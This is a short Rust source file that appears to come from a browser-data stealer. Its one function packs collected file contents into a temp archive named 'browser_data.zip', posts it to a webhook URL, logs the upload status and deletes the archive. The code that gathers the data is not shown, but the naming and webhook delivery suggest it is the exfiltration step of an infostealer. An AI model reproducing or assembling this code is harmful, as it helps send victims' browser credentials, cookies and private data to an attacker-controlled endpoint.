use std::{env, fs, io::Write};
use zip::write::FileOptions;

pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    if files.is_empty() {
        return Ok(());
    }

    let zip_path = env::temp_dir().join("browser_data.zip");
    crate::log::log(&format!("zip building: {} entries", files.len()));

    {
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;
    crate::log::log(&format!("zip size: {} bytes", zip_data.len()));

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name("browser_data.zip")
        .mime_str("application/zip")?;

    let form = reqwest::multipart::Form::new().part("file", part);

    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    let body = response.text().await.unwrap_or_default();
    crate::log::log(&format!("webhook zip send: HTTP {status}"));
    if !status.is_success() {
        crate::log::log(&format!("webhook zip body: {body}"));
        return Err(format!("webhook failed: {status} {body}").into());
    }

    let _ = fs::remove_file(&zip_path);

    Ok(())
}
